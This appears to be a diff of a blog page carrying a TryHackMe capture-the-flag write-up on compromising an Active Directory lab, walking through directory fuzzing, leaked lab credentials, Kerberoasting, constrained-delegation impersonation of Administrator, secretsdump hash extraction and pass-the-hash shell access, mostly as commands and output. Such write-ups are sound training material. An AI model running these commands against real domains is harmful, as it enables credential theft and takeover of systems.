+<h2 id="web-fuzzing">Web fuzzing<a hidden class="anchor" aria-hidden="true" href="#web-fuzzing">#</a></h2>
+<p><strong>Command:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://10.10.96.32/FUZZ -w /usr/share/wordlists/dirb/common.txt
+</span></span></code></pre></div><p><strong>Output (trimmed):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>index.html              [Status: 200, Size: 5342323]
+</span></span><span style="display:flex;"><span>robots.txt              [Status: 200, Size: 70]
+</span></span></code></pre></div><h3 id="robotstxt">robots.txt<a hidden class="anchor" aria-hidden="true" href="#robotstxt">#</a></h3>
+<pre tabindex="0"><code>User-Agent: *
 Disallow:
 /robots.txt
 /db-config.bak
 /backdoor.php
-</code></pre><p>Found: <code>/db-config.bak</code> — contains server credentials:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$servername <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;db.cooctus.corp&#34;</span>;
-</span></span><span style=display:flex><span>$username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;C00ctusAdm1n&#34;</span>;
-</span></span><span style=display:flex><span>$password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;B4dt0th3b0n3&#34;</span>;
-</span></span></code></pre></div><p>Tried rpcclient — nothing interesting returned, then attempted RDP.</p><hr><h2 id=rdp-and-found-credentials>RDP and found credentials<a hidden class=anchor aria-hidden=true href=#rdp-and-found-credentials>#</a></h2><p><strong>RDP connect attempt:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rdesktop -f -u <span style=color:#e6db74>&#34;&#34;</span> 10.10.23.38
-</span></span></code></pre></div><p>RDP warned about an invalid certificate (self-signed). Connected and found credentials in the lockscreen wallpaper:</p><pre tabindex=0><code>Visitor
+</code></pre><p>Found: <code>/db-config.bak</code> — contains server credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$servername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;db.cooctus.corp&#34;</span>;
+</span></span><span style="display:flex;"><span>$username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C00ctusAdm1n&#34;</span>;
+</span></span><span style="display:flex;"><span>$password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B4dt0th3b0n3&#34;</span>;
+</span></span></code></pre></div><p>Tried rpcclient — nothing interesting returned, then attempted RDP.</p>
+<hr>
+<h2 id="rdp-and-found-credentials">RDP and found credentials<a hidden class="anchor" aria-hidden="true" href="#rdp-and-found-credentials">#</a></h2>
+<p><strong>RDP connect attempt:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rdesktop -f -u <span style="color:#e6db74">&#34;&#34;</span> 10.10.23.38
+</span></span></code></pre></div><p>RDP warned about an invalid certificate (self-signed). Connected and found credentials in the lockscreen wallpaper:</p>
+<pre tabindex="0"><code>Visitor
 GuestLogin!
-</code></pre><p>Use these credentials for credential spray / access.</p><hr><h2 id=smb-access-with-credentials>SMB access with credentials<a hidden class=anchor aria-hidden=true href=#smb-access-with-credentials>#</a></h2><p><strong>CrackMapExec:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>crackmapexec smb 10.10.23.38 -u Visitor -p GuestLogin! --users
-</span></span></code></pre></div><p>Output shows <code>COOCTUS.CORP\Visitor:GuestLogin!</code> is valid.</p><p><strong>Enumerating shares:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>smbclient -L //10.10.23.38 -U <span style=color:#e6db74>&#34;Visitor&#34;</span>
-</span></span></code></pre></div><p>Accessible shares: <code>ADMIN$</code>, <code>C$</code>, <code>Home</code>, <code>IPC$</code>, <code>NETLOGON</code>, <code>SYSVOL</code>.</p><p><strong>Access Home share:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>smbclient //10.10.175.192/Home -U <span style=color:#e6db74>&#34;Visitor&#34;</span>
-</span></span></code></pre></div><p>Found <code>user.txt</code>:</p><pre tabindex=0><code>THM{Gu3st_******}
-</code></pre><hr><h2 id=ldap--ad-enumeration>LDAP / AD enumeration<a hidden class=anchor aria-hidden=true href=#ldap--ad-enumeration>#</a></h2><p>Used <code>enum4linux-ng</code> and <code>ldapdomaindump</code> to dump AD details.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ldapdomaindump 10.10.175.192 -u <span style=color:#e6db74>&#34;COOCTUS\Visitor&#34;</span> -p <span style=color:#e6db74>&#39;GuestLogin!&#39;</span>
-</span></span></code></pre></div><p>Found <code>password-reset</code> account configured with <code>TRUSTED_TO_AUTH_FOR_DELEGATION!</code> — supports constrained delegation theory.</p><hr><h2 id=kerberos--getuserspns--crack-tgs>Kerberos — GetUserSPNs & Crack TGS<a hidden class=anchor aria-hidden=true href=#kerberos--getuserspns--crack-tgs>#</a></h2><p><strong>GetUserSPNs:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>impacket-GetUserSPNs COOCTUS.CORP/Visitor:GuestLogin! -request -dc-ip 10.10.96.32 -outputfile TGS.txt
-</span></span></code></pre></div><p>Returned SPN: <code>HTTP/dc.cooctus.corp password-reset</code> (constrained).</p><p><strong>Cracked TGS with John:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>john --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt hash_crocc
-</span></span></code></pre></div><p>Result: <code>resetpassword</code> cracked.</p><hr><h2 id=delegation-discovery-and-abuse>Delegation discovery and abuse<a hidden class=anchor aria-hidden=true href=#delegation-discovery-and-abuse>#</a></h2><p><strong>Find delegation:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>impacket-findDelegation -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.96.32
-</span></span></code></pre></div><p>Delegation rights to: <code>oakley/DC.COOCTUS.CORP</code>.</p><p><strong>Get ST (impersonate Administrator):</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator <span style=color:#e6db74>&#34;COOCTUS.CORP/password-reset:resetpassword&#34;</span> -dc-ip 10.10.96.32
-</span></span></code></pre></div><p>Saved ticket: <code>Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache</code>.</p><p>Set the ticket for local usage:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export KRB5CCNAME<span style=color:#f92672>=</span>Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
-</span></span></code></pre></div><p>Added host entry for <code>DC.COOCTUS.CORP</code> to <code>/etc/hosts</code>:</p><pre tabindex=0><code>10.10.175.192   DC.COOCTUS.CORP
-</code></pre><hr><h2 id=retrieving-secrets-secretsdump>Retrieving secrets (secretsdump)<a hidden class=anchor aria-hidden=true href=#retrieving-secrets-secretsdump>#</a></h2><p>Used impacket <code>secretsdump</code> with Kerberos ticket:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
-</span></span></code></pre></div><p>Key results (trimmed):</p><pre tabindex=0><code>Administrator:500:...:add41095f1fb0405b32f70a489de022d:::
+</code></pre><p>Use these credentials for credential spray / access.</p>
+<hr>
+<h2 id="smb-access-with-credentials">SMB access with credentials<a hidden class="anchor" aria-hidden="true" href="#smb-access-with-credentials">#</a></h2>
+<p><strong>CrackMapExec:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 10.10.23.38 -u Visitor -p GuestLogin! --users
+</span></span></code></pre></div><p>Output shows <code>COOCTUS.CORP\Visitor:GuestLogin!</code> is valid.</p>
+<p><strong>Enumerating shares:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L //10.10.23.38 -U <span style="color:#e6db74">&#34;Visitor&#34;</span>
+</span></span></code></pre></div><p>Accessible shares: <code>ADMIN$</code>, <code>C$</code>, <code>Home</code>, <code>IPC$</code>, <code>NETLOGON</code>, <code>SYSVOL</code>.</p>
+<p><strong>Access Home share:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.10.175.192/Home -U <span style="color:#e6db74">&#34;Visitor&#34;</span>
+</span></span></code></pre></div><p>Found <code>user.txt</code>:</p>
+<pre tabindex="0"><code>THM{Gu3st_******}
+</code></pre><hr>
+<h2 id="ldap--ad-enumeration">LDAP / AD enumeration<a hidden class="anchor" aria-hidden="true" href="#ldap--ad-enumeration">#</a></h2>
+<p>Used <code>enum4linux-ng</code> and <code>ldapdomaindump</code> to dump AD details.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapdomaindump 10.10.175.192 -u <span style="color:#e6db74">&#34;COOCTUS\Visitor&#34;</span> -p <span style="color:#e6db74">&#39;GuestLogin!&#39;</span>
+</span></span></code></pre></div><p>Found <code>password-reset</code> account configured with <code>TRUSTED_TO_AUTH_FOR_DELEGATION!</code> — supports constrained delegation theory.</p>
+<hr>
+<h2 id="kerberos--getuserspns--crack-tgs">Kerberos — GetUserSPNs &amp; Crack TGS<a hidden class="anchor" aria-hidden="true" href="#kerberos--getuserspns--crack-tgs">#</a></h2>
+<p><strong>GetUserSPNs:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-GetUserSPNs COOCTUS.CORP/Visitor:GuestLogin! -request -dc-ip 10.10.96.32 -outputfile TGS.txt
+</span></span></code></pre></div><p>Returned SPN: <code>HTTP/dc.cooctus.corp  password-reset</code> (constrained).</p>
+<p><strong>Cracked TGS with John:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash_crocc
+</span></span></code></pre></div><p>Result: <code>resetpassword</code> cracked.</p>
+<hr>
+<h2 id="delegation-discovery-and-abuse">Delegation discovery and abuse<a hidden class="anchor" aria-hidden="true" href="#delegation-discovery-and-abuse">#</a></h2>
+<p><strong>Find delegation:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-findDelegation -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.96.32
+</span></span></code></pre></div><p>Delegation rights to: <code>oakley/DC.COOCTUS.CORP</code>.</p>
+<p><strong>Get ST (impersonate Administrator):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator <span style="color:#e6db74">&#34;COOCTUS.CORP/password-reset:resetpassword&#34;</span> -dc-ip 10.10.96.32
+</span></span></code></pre></div><p>Saved ticket: <code>Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache</code>.</p>
+<p>Set the ticket for local usage:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
+</span></span></code></pre></div><p>Added host entry for <code>DC.COOCTUS.CORP</code> to <code>/etc/hosts</code>:</p>
+<pre tabindex="0"><code>10.10.175.192   DC.COOCTUS.CORP
+</code></pre><hr>
+<h2 id="retrieving-secrets-secretsdump">Retrieving secrets (secretsdump)<a hidden class="anchor" aria-hidden="true" href="#retrieving-secrets-secretsdump">#</a></h2>
+<p>Used impacket <code>secretsdump</code> with Kerberos ticket:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
+</span></span></code></pre></div><p>Key results (trimmed):</p>
+<pre tabindex="0"><code>Administrator:500:...:add41095f1fb0405b32f70a489de022d:::
 ... (many domain accounts and Kerberos keys)
-</code></pre><p>Administrator NT hash: <code>add41095f1fb0405b32f70a489de022d</code>.</p><hr><h2 id=administrator-access-with-evil-winrm>Administrator access with Evil-WinRM<a hidden class=anchor aria-hidden=true href=#administrator-access-with-evil-winrm>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>evil-winrm -i 10.10.96.32 -u Administrator -H <span style=color:#e6db74>&#39;add41095f1fb0405b32f70a489de022d&#39;</span>
-</span></span></code></pre></div><p>Got Administrator shell.</p><hr><h2 id=flags>Flags<a hidden class=anchor aria-hidden=true href=#flags>#</a></h2><p><strong>User flag (from Home share):</strong></p><pre tabindex=0><code>THM{Gu3st_******}
-</code></pre><p><strong>Privilege escalation flags (found on system):</strong></p><pre tabindex=0><code>THM{0n-************-DA}
+</code></pre><p>Administrator NT hash: <code>add41095f1fb0405b32f70a489de022d</code>.</p>
+<hr>
+<h2 id="administrator-access-with-evil-winrm">Administrator access with Evil-WinRM<a hidden class="anchor" aria-hidden="true" href="#administrator-access-with-evil-winrm">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.10.96.32 -u Administrator -H <span style="color:#e6db74">&#39;add41095f1fb0405b32f70a489de022d&#39;</span>
+</span></span></code></pre></div><p>Got Administrator shell.</p>
+<hr>
+<h2 id="flags">Flags<a hidden class="anchor" aria-hidden="true" href="#flags">#</a></h2>
+<p><strong>User flag (from Home share):</strong></p>
+<pre tabindex="0"><code>THM{Gu3st_******}
+</code></pre><p><strong>Privilege escalation flags (found on system):</strong></p>
+<pre tabindex="0"><code>THM{0n-************-DA}
 THM{Wh4t-t0-d0*******************}
-</code></pre><p><strong>Root flag:</strong></p><p>Found in <code>C:\PerfLogs\Admin\root.txt</code>:</p><pre tabindex=0><code>THM{Cr0cc*****************}
-</code></pre><hr><h2 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2><p>We enumerated the host, found web and RDP entry points, discovered credentials via an exposed backup file and RDP wallpaper, authenticated to SMB, enumerated AD, abused constrained delegation to impersonate Administrator, retrieved NT hashes and Kerberos keys with <code>secretsdump</code>, and obtained Administrator access to read flags.</p><p><strong>The END.</strong></p><hr></div><footer class=post-footer><ul class=post-tags><li><a href=https://n0rmh3ll.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://n0rmh3ll.github.io/tags/active-directory/>Active-Directory</a></li><li><a href=https://n0rmh3ll.github.io/tags/kerberos/>Kerberos</a></li><li><a href=https://n0rmh3ll.github.io/tags/privilege-escalation/>Privilege-Escalation</a></li><li><a href=https://n0rmh3ll.github.io/tags/red-team/>Red-Team</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://n0rmh3ll.github.io/>n0rmh3ll</a></span> ·
-<span>Powered by
-<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
-<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
-</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script></body></html>
+</code></pre><p><strong>Root flag:</strong></p>
+<p>Found in <code>C:\PerfLogs\Admin\root.txt</code>:</p>
+<pre tabindex="0"><code>THM{Cr0cc*****************}
+</code></pre><hr>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>We enumerated the host, found web and RDP entry points, discovered credentials via an exposed backup file and RDP wallpaper, authenticated to SMB, enumerated AD, abused constrained delegation to impersonate Administrator, retrieved NT hashes and Kerberos keys with <code>secretsdump</code>, and obtained Administrator access to read flags.</p>
+<p><strong>The END.</strong></p>
+<hr>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/tryhackme/">Tryhackme</a></li>
+      <li><a href="http://localhost:1313/tags/active-directory/">Active-Directory</a></li>
+      <li><a href="http://localhost:1313/tags/kerberos/">Kerberos</a></li>
+      <li><a href="http://localhost:1313/tags/privilege-escalation/">Privilege-Escalation</a></li>
+      <li><a href="http://localhost:1313/tags/red-team/">Red-Team</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">n0rmh3ll</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
